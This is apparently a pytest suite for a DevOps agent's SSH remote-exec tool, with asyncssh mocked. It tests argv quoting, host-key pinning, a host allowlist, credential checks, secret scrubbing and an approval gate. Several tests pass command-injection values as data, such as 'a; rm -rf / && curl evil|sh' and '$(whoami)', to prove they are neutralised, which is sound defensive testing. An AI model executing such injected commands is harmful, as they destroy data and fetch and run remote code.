"""Tests for the structured remote-exec tool ssh_run(host, argv) + the SshExecutor.

asyncssh is MOCKED throughout — no test opens a real socket. Two layers are exercised:

* :class:`~opendevops.tools.executor.SshExecutor` with ``asyncssh.connect`` monkeypatched to a
  fake connection — this is where the load-bearing "argv-form, no remote shell" guarantee lives:
  the command sent over the exec channel is ``shlex.join(argv)`` (each token shell-quoted), the
  config-pinned connect kwargs (user/key/known_hosts/port/timeout) are asserted, host-key
  verification failures become :class:`SshConnectionError`, and a per-command timeout returns an
  ``ExecResult`` with ``timed_out=True``.
* :func:`~opendevops.tools.ssh_run.ssh_run_core` with a FAKE executor injected — the tool
  orchestration: host-allowlist re-validation (deny before connect), credential fail-closed, the
  scrub/EXEC_META output pipeline, and boundary rejections.
"""

from __future__ import annotations

import copy
import shlex
from contextlib import contextmanager
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import asyncssh
import pytest
from langchain_core.messages import ToolMessage
from langchain_core.tools import BaseTool
from langgraph.types import Command

from opendevops.config import AppConfig
from opendevops.tools.executor import (
    CredentialUnavailable,
    ExecResult,
    SshConnectionError,
    SshCredential,
    SshExecutor,
    resolve_ssh_credential,
)
from opendevops.tools.run_command import EXEC_META_KEY, ExecDecision, current_decision
from opendevops.tools.ssh_run import (
    _SSH_REFUSED,
    SSH_RUN_NAME,
    make_ssh_run,
    ssh_run_core,
)

# --------------------------------------------------------------------------------------
# config helpers
# --------------------------------------------------------------------------------------

ALLOWED_HOST = "allowed.host.internal"
KEY_ENV = "OPENDEVOPS_TEST_SSH_KEY_UNIT"
KEY_PATH = "/fake/id_ed25519"

# Set by the session-scoped ``_known_hosts_file`` fixture to a REAL (empty) file, so
# resolve_ssh_credential's Minor-1 ``is_file()`` pre-flight passes on the executing-path tests
# (an empty-but-present file is acceptably fail-closed at connect). ``_cfg()`` injects it into the
# default ssh block unless a test overrides the whole ssh block.
_KNOWN_HOSTS_PATH = "/etc/agent/known_hosts"

BASE_CONFIG: dict[str, Any] = {
    "targets": {
        "kubernetes": {
            "kubeconfig_ro": "/tmp/agent-kubeconfig-ro.yaml",
            "kubeconfig_rw": None,
            "allowed_contexts": [],
        },
        "ssh": {
            "hosts": [ALLOWED_HOST],
            "user": "deploy",
            "key_env": KEY_ENV,
            "known_hosts_path": "/etc/agent/known_hosts",
            "port": 2222,
        },
    },
    "execution": {
        "cmd_timeout_seconds": 60,
        "output_max_chars": 50000,
        "env_allowlist": ["PATH", "HOME"],
    },
    "audit": {"dir": "./audit"},
    "policy": {"dir": "./config/policy"},
    "principals": {},
}
BASE_MODELS: dict[str, Any] = {
    "agents": {"main": "opus"},
    "aliases": {"opus": "anthropic:claude-opus-4-8"},
    "pricing": {
        "anthropic:claude-opus-4-8": {
            "input": 5.0,
            "output": 25.0,
            "cache_read": 0.5,
            "cache_write": 6.25,
        }
    },
    "fallback_pricing": "error",
}
BASE_BUDGETS: dict[str, Any] = {
    "trip_ratio": 0.9,
    "fail_mode_on_counter_outage": "closed",
    "per_run": {
        "default": {
            "usd": 2.0,
            "model_calls": 50,
            "tool_calls": 100,
            "shell_calls": 30,
            "recursion_limit": 250,
            "wall_clock_s": 900,
        }
    },
    "daily": {"global_usd": 50.0, "per_principal_usd": 25.0},
}


def _cfg(**overrides: Any) -> AppConfig:
    """Build a validated AppConfig with ssh configured; ``ssh=<dict>`` replaces the ssh block."""
    doc = copy.deepcopy(BASE_CONFIG)
    if "ssh" in overrides:
        ssh = overrides.pop("ssh")
        if ssh is None:
            doc["targets"].pop("ssh", None)
        else:
            doc["targets"]["ssh"] = ssh
    else:
        # Point the default ssh block's known_hosts at a real file (Minor 1 is_file() pre-flight).
        doc["targets"]["ssh"]["known_hosts_path"] = _KNOWN_HOSTS_PATH
    if "output_max_chars" in overrides:
        doc["execution"]["output_max_chars"] = overrides.pop("output_max_chars")
    assert not overrides, overrides
    return AppConfig.model_validate(
        {**doc, "models": BASE_MODELS, "budgets": BASE_BUDGETS}
    )


class FakeSshExecutor:
    """Records the (host, argv, timeout, cred) it is called with; returns a canned result/raises."""

    def __init__(
        self, result: ExecResult | None = None, error: Exception | None = None
    ) -> None:
        self.result = result
        self.error = error
        self.calls: list[tuple[str, list[str], int, SshCredential]] = []

    async def execute(
        self, host: str, argv: list[str], timeout_s: int, cred: SshCredential
    ) -> ExecResult:
        self.calls.append((host, list(argv), timeout_s, cred))
        if self.error is not None:
            raise self.error
        assert self.result is not None
        return self.result


@pytest.fixture(autouse=True)
def _key_env(monkeypatch: pytest.MonkeyPatch) -> None:
    """The key env var resolves to a path by default (a value, not the real file)."""
    monkeypatch.setenv(KEY_ENV, KEY_PATH)


@pytest.fixture(scope="session", autouse=True)
def _known_hosts_file(tmp_path_factory: pytest.TempPathFactory) -> None:
    """Create a real (empty) known_hosts file for the Minor-1 is_file() pre-flight and expose it."""
    kh = tmp_path_factory.mktemp("ssh") / "known_hosts"
    kh.touch()
    global _KNOWN_HOSTS_PATH
    _KNOWN_HOSTS_PATH = str(kh)


@pytest.fixture(autouse=True)
def _reset_decision() -> Any:
    """Keep the decision contextvar from leaking between tests (default: no decision set)."""
    token = current_decision.set(None)
    yield
    current_decision.reset(token)


@contextmanager
def decision(dec: ExecDecision | None) -> Any:
    """Set the ``current_decision`` the ssh_run gate re-checks (mirrors run_command's helper)."""
    tok = current_decision.set(dec)
    try:
        yield
    finally:
        current_decision.reset(tok)


def _ssh_decision(
    argv: list[str],
    *,
    tool_call_id: str = "c",
    channel: str = "ro",
    family: str | None = "ssh",
) -> ExecDecision:
    """A matching ssh ExecDecision: tool_family='ssh', channel='ro', argv == the remote argv."""
    return ExecDecision(
        tool_call_id=tool_call_id, channel=channel, tool_family=family, argv=tuple(argv)
    )


# --------------------------------------------------------------------------------------
# fake asyncssh plumbing (SshExecutor layer)
# --------------------------------------------------------------------------------------


class _FakeConn:
    def __init__(self, captured: dict[str, Any], completed: Any) -> None:
        self._captured = captured
        self._completed = completed

    async def run(self, command: str, *, stderr: Any = None, timeout: Any = None) -> Any:
        self._captured["command"] = command
        self._captured["stderr"] = stderr
        self._captured["timeout"] = timeout
        if isinstance(self._completed, BaseException):
            raise self._completed
        return self._completed


class _FakeConnectCtx:
    def __init__(self, captured: dict[str, Any], completed: Any) -> None:
        self._conn = _FakeConn(captured, completed)

    async def __aenter__(self) -> _FakeConn:
        return self._conn

    async def __aexit__(self, *exc: Any) -> bool:
        return False


def _install_fake_connect(
    monkeypatch: pytest.MonkeyPatch,
    captured: dict[str, Any],
    completed: Any = None,
    *,
    connect_error: BaseException | None = None,
) -> None:
    def _connect(host: str, **kwargs: Any) -> _FakeConnectCtx:
        captured["host"] = host
        captured["connect_kwargs"] = kwargs
        if connect_error is not None:
            raise connect_error
        return _FakeConnectCtx(captured, completed)

    monkeypatch.setattr(asyncssh, "connect", _connect)


def _cred() -> SshCredential:
    return SshCredential(
        user="deploy",
        key_path=KEY_PATH,
        known_hosts_path="/etc/agent/known_hosts",
        port=2222,
    )


# --------------------------------------------------------------------------------------
# SshExecutor — argv-form (shlex), pinned connect kwargs, timeout, errors
# --------------------------------------------------------------------------------------


async def test_executor_sends_shlex_joined_command_argv_form(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The exec channel carries shlex.join(argv): metacharacters are QUOTED, not interpreted."""
    captured: dict[str, Any] = {}
    completed = SimpleNamespace(stdout="ok\n", returncode=0, exit_status=0)
    _install_fake_connect(monkeypatch, captured, completed)

    argv = ["systemctl", "status", "a; rm -rf /", "$(whoami)"]
    result = await SshExecutor().execute(ALLOWED_HOST, argv, 30, _cred())

    # The remote command is the shell-quoted join — the ';' and '$(...)' are inside single quotes,
    # so the remote shell parses the string back into EXACTLY the argv, never interpreting them.
    assert captured["command"] == shlex.join(argv)
    assert captured["command"] == "systemctl status 'a; rm -rf /' '$(whoami)'"
    assert "; rm -rf /" not in captured["command"].replace("'a; rm -rf /'", "")
    assert result.exit_code == 0
    assert result.output == "ok\n"
    assert result.timed_out is False


async def test_executor_pins_connect_kwargs_and_merges_stderr(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """user/key/known_hosts/port/timeout are the config-pinned values; stderr merges into stdout."""
    captured: dict[str, Any] = {}
    completed = SimpleNamespace(stdout="out", returncode=3, exit_status=3)
    _install_fake_connect(monkeypatch, captured, completed)

    result = await SshExecutor().execute(ALLOWED_HOST, ["df", "-h"], 45, _cred())

    assert captured["host"] == ALLOWED_HOST
    kwargs = captured["connect_kwargs"]
    assert kwargs["username"] == "deploy"
    assert kwargs["client_keys"] == [KEY_PATH]
    assert kwargs["known_hosts"] == "/etc/agent/known_hosts"  # host-key verification ON (pinned)
    assert kwargs["port"] == 2222
    assert "connect_timeout" in kwargs
    assert captured["stderr"] == asyncssh.STDOUT  # combined stdout+stderr
    assert captured["timeout"] == 45
    assert result.exit_code == 3


async def test_executor_unknown_host_key_refuses_fail_closed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An unverifiable server key (known_hosts pinned) raises SshConnectionError — no exec."""
    captured: dict[str, Any] = {}
    _install_fake_connect(
        monkeypatch,
        captured,
        connect_error=asyncssh.HostKeyNotVerifiable("host key not verifiable"),
    )
    with pytest.raises(SshConnectionError, match="ssh connection to"):
        await SshExecutor().execute(ALLOWED_HOST, ["df"], 30, _cred())


async def test_executor_connection_refused_is_ssh_connection_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A transport OSError (DNS/refused/unreachable) becomes a fail-closed SshConnectionError."""
    captured: dict[str, Any] = {}
    _install_fake_connect(
        monkeypatch, captured, connect_error=OSError("connection refused")
    )
    with pytest.raises(SshConnectionError):
        await SshExecutor().execute(ALLOWED_HOST, ["df"], 30, _cred())


async def test_executor_timeout_returns_timed_out_result(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A per-command timeout DID start the command: ExecResult(timed_out=True, exit -9)."""
    captured: dict[str, Any] = {}
    # asyncssh.TimeoutError has a heavy ProcessError ctor; a builtin TimeoutError with a .stdout
    # attribute exercises the SAME executor branch (it catches both TimeoutError types).
    timeout_exc = TimeoutError("timed out")
    timeout_exc.stdout = "partial output"  # type: ignore[attr-defined]
    _install_fake_connect(monkeypatch, captured, completed=timeout_exc)

    result = await SshExecutor().execute(ALLOWED_HOST, ["journalctl"], 5, _cred())
    assert result.timed_out is True
    assert result.exit_code == -9
    assert result.output == "partial output"


# --------------------------------------------------------------------------------------
# resolve_ssh_credential — fail-closed on every missing piece
# --------------------------------------------------------------------------------------


def test_resolve_credential_happy_path(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv(KEY_ENV, "~/keys/id")
    cred = resolve_ssh_credential(_cfg())
    assert cred.user == "deploy"
    assert cred.key_path == str(Path("~/keys/id").expanduser())
    assert cred.known_hosts_path == str(Path(_KNOWN_HOSTS_PATH))
    assert cred.port == 2222
    assert cred.passphrase is None


def test_resolve_credential_unconfigured_key_env() -> None:
    cfg = _cfg(ssh={"hosts": [ALLOWED_HOST], "user": "deploy", "known_hosts_path": "/kh"})
    with pytest.raises(CredentialUnavailable, match="key env var not configured"):
        resolve_ssh_credential(cfg)


def test_resolve_credential_key_env_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(KEY_ENV, raising=False)
    with pytest.raises(CredentialUnavailable, match="unset or empty"):
        resolve_ssh_credential(_cfg())


def test_resolve_credential_missing_user() -> None:
    cfg = _cfg(ssh={"hosts": [ALLOWED_HOST], "key_env": KEY_ENV, "known_hosts_path": "/kh"})
    with pytest.raises(CredentialUnavailable, match="user not configured"):
        resolve_ssh_credential(cfg)


def test_resolve_credential_missing_known_hosts_is_fail_closed() -> None:
    """No known_hosts => refuse; there is no path that disables host-key verification."""
    cfg = _cfg(ssh={"hosts": [ALLOWED_HOST], "user": "deploy", "key_env": KEY_ENV})
    with pytest.raises(CredentialUnavailable, match="known_hosts not configured"):
        resolve_ssh_credential(cfg)


def test_resolve_credential_missing_known_hosts_file_is_fail_closed() -> None:
    """Minor 1: a configured-but-absent known_hosts FILE refuses at credential resolution."""
    cfg = _cfg(
        ssh={
            "hosts": [ALLOWED_HOST],
            "user": "deploy",
            "key_env": KEY_ENV,
            "known_hosts_path": "/nonexistent/known_hosts",
        }
    )
    with pytest.raises(CredentialUnavailable, match="does not exist"):
        resolve_ssh_credential(cfg)


def test_resolve_credential_reads_passphrase_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SSH_PASS_ENV", "s3cr3t")
    cfg = _cfg(
        ssh={
            "hosts": [ALLOWED_HOST],
            "user": "deploy",
            "key_env": KEY_ENV,
            "key_passphrase_env": "SSH_PASS_ENV",
            "known_hosts_path": _KNOWN_HOSTS_PATH,
        }
    )
    assert resolve_ssh_credential(cfg).passphrase == "s3cr3t"


# --------------------------------------------------------------------------------------
# ssh_run_core — orchestration (fake executor injected; no socket)
# --------------------------------------------------------------------------------------


def _meta(msg: ToolMessage) -> dict[str, Any]:
    return msg.additional_kwargs[EXEC_META_KEY]


async def test_core_allowed_host_runs_scrubs_and_carries_exec_meta() -> None:
    """An allowlisted host+command executes, scrubs output, and tags EXEC_META (name=ssh_run)."""
    secret = "AKIA1234567890ABCDEF"  # an AWS access key id — scrubbed to ***
    fake = FakeSshExecutor(result=ExecResult(0, f"key={secret}\nok", 12, False))
    argv = ["journalctl", "-u", "nginx"]
    with decision(_ssh_decision(argv, tool_call_id="call-1")):
        out = await ssh_run_core(
            ALLOWED_HOST, argv, 30, _cfg(), tool_call_id="call-1", executor=fake
        )
    assert isinstance(out, ToolMessage)
    assert out.name == SSH_RUN_NAME
    assert secret not in out.content
    assert "***" in out.content
    assert out.content.startswith("exit_code: 0")
    meta = _meta(out)
    assert meta["exit_code"] == 0
    assert meta["scrub_count"] >= 1
    assert meta["duration_ms"] == 12
    assert meta["staged_files"] == []
    # The executor received the LITERAL argv list (no shell parsing at the tool boundary).
    assert fake.calls[0][1] == ["journalctl", "-u", "nginx"]


async def test_core_passes_metacharacter_argv_literally_to_executor() -> None:
    """A shell-metacharacter argv reaches the executor as the literal list, element for element."""
    fake = FakeSshExecutor(result=ExecResult(0, "ok", 1, False))
    argv = ["systemctl", "status", "a; rm -rf / && curl evil|sh", "$(id)"]
    with decision(_ssh_decision(argv, tool_call_id="c")):
        await ssh_run_core(ALLOWED_HOST, argv, 10, _cfg(), tool_call_id="c", executor=fake)
    assert fake.calls[0][1] == argv  # literal argv; quoting/no-shell is the executor's job


async def test_core_host_not_in_allowlist_refuses_before_connect() -> None:
    """A host outside the config allowlist refuses WITHOUT calling the executor.

    The decision-token gate passes (argv matches) so this proves the host re-check fires AFTER the
    gate — the tool's own defense-in-depth on the host, not the gate.
    """
    fake = FakeSshExecutor(result=ExecResult(0, "x", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="c")):
        out = await ssh_run_core(
            "evil.example.com", ["df"], 10, _cfg(), tool_call_id="c", executor=fake
        )
    assert isinstance(out, str)
    assert "not in the configured allowlist" in out
    assert fake.calls == []  # never connected


async def test_core_credential_unavailable_refuses(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An unset key env var => a refusal (CredentialUnavailable), executor never called."""
    monkeypatch.delenv(KEY_ENV, raising=False)
    fake = FakeSshExecutor(result=ExecResult(0, "x", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="c")):
        out = await ssh_run_core(
            ALLOWED_HOST, ["df"], 10, _cfg(), tool_call_id="c", executor=fake
        )
    assert isinstance(out, str)
    assert out.startswith("ssh refused:")
    assert fake.calls == []


async def test_core_connection_error_becomes_refusal_no_meta() -> None:
    """A connect/host-key failure is a refusal string with NO EXEC_META (no execution audit)."""
    fake = FakeSshExecutor(error=SshConnectionError("ssh connection to 'h' failed: bad key"))
    with decision(_ssh_decision(["df"], tool_call_id="c")):
        out = await ssh_run_core(
            ALLOWED_HOST, ["df"], 10, _cfg(), tool_call_id="c", executor=fake
        )
    assert isinstance(out, str)
    assert out.startswith("ssh refused:")
    # Minor 3: the refusal is a generic literal (no raw asyncssh text -> no key-path leak).
    assert out == "ssh refused: connection or host-key verification to " f"{ALLOWED_HOST!r} failed"
    assert "bad key" not in out


@pytest.mark.parametrize(
    ("host", "argv", "needle"),
    [
        ("", ["df"], "host must be a non-empty string"),
        (ALLOWED_HOST, [], "argv must be a non-empty list"),
        (ALLOWED_HOST, ["df", 3], "argv elements must all be strings"),
        (ALLOWED_HOST, ["/usr/bin/df"], "bare program name"),
    ],
)
async def test_core_boundary_rejections(host: Any, argv: Any, needle: str) -> None:
    fake = FakeSshExecutor(result=ExecResult(0, "x", 1, False))
    out = await ssh_run_core(host, argv, 10, _cfg(), tool_call_id="c", executor=fake)
    assert isinstance(out, str)
    assert needle in out
    assert fake.calls == []


async def test_core_clamps_timeout() -> None:
    """timeout_s is clamped to [1, min(cmd_timeout_seconds, 300)] before reaching the executor."""
    fake = FakeSshExecutor(result=ExecResult(0, "x", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="c")):
        await ssh_run_core(
            ALLOWED_HOST, ["df"], 99999, _cfg(), tool_call_id="c", executor=fake
        )
    assert fake.calls[0][2] == 60  # cfg.execution.cmd_timeout_seconds


async def test_core_truncation_spills_to_virtual_fs() -> None:
    """Output over output_max_chars spills the full scrubbed text to /output/<id>.txt (Command)."""
    big = "x" * 200
    fake = FakeSshExecutor(result=ExecResult(0, big, 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="call-trunc")):
        out = await ssh_run_core(
            ALLOWED_HOST, ["df"], 10, _cfg(output_max_chars=50),
            tool_call_id="call-trunc", executor=fake,
        )
    assert isinstance(out, Command)
    assert "/output/call-trunc.txt" in out.update["files"]
    msg = out.update["messages"][0]
    assert isinstance(msg, ToolMessage)
    assert _meta(msg)["truncated"] is True


async def test_core_no_tool_call_id_degrades_to_string() -> None:
    """Without a tool_call_id (direct unit call) there is no ToolMessage to carry meta.

    The gate still requires a matching decision argv; the tool_call_id sub-check is skipped when the
    call supplies no id (parity with run_command).
    """
    fake = FakeSshExecutor(result=ExecResult(0, "ok", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="unused")):
        out = await ssh_run_core(ALLOWED_HOST, ["df"], 10, _cfg(), executor=fake)
    assert isinstance(out, str)
    assert out.startswith("exit_code: 0")


# --------------------------------------------------------------------------------------
# ssh_run_core — the decision-token gate (symmetry with run_command; load-bearing)
# --------------------------------------------------------------------------------------


async def test_core_gate_refuses_without_decision_no_executor_call() -> None:
    """No current_decision => the gate refuses BEFORE any connect (proves the gate is load-bearing).

    The autouse ``_reset_decision`` fixture leaves current_decision = None, so no ``with decision``.
    """
    fake = FakeSshExecutor(result=ExecResult(0, "should-not-run", 1, False))
    out = await ssh_run_core(
        ALLOWED_HOST, ["df"], 10, _cfg(), tool_call_id="c", executor=fake
    )
    assert out == _SSH_REFUSED
    assert fake.calls == []  # the executor was never reached


async def test_core_gate_refuses_on_argv_mismatch_no_executor_call() -> None:
    """A decision whose argv differs from the call's argv refuses (no exec)."""
    fake = FakeSshExecutor(result=ExecResult(0, "should-not-run", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="c")):
        out = await ssh_run_core(
            ALLOWED_HOST, ["journalctl"], 10, _cfg(), tool_call_id="c", executor=fake
        )
    assert out == _SSH_REFUSED
    assert fake.calls == []


async def test_core_gate_refuses_on_tool_call_id_mismatch_no_executor_call() -> None:
    """A decision whose tool_call_id differs from the call's id refuses (no exec)."""
    fake = FakeSshExecutor(result=ExecResult(0, "should-not-run", 1, False))
    with decision(_ssh_decision(["df"], tool_call_id="call-A")):
        out = await ssh_run_core(
            ALLOWED_HOST, ["df"], 10, _cfg(), tool_call_id="call-B", executor=fake
        )
    assert out == _SSH_REFUSED
    assert fake.calls == []


# --------------------------------------------------------------------------------------
# make_ssh_run — the tool object
# --------------------------------------------------------------------------------------


def test_make_ssh_run_builds_named_structured_tool() -> None:
    tool = make_ssh_run(_cfg())
    assert isinstance(tool, BaseTool)
    assert tool.name == SSH_RUN_NAME
    fields = set(tool.args_schema.model_json_schema()["properties"])  # type: ignore[union-attr]
    assert {"host", "argv", "timeout_s"} <= fields
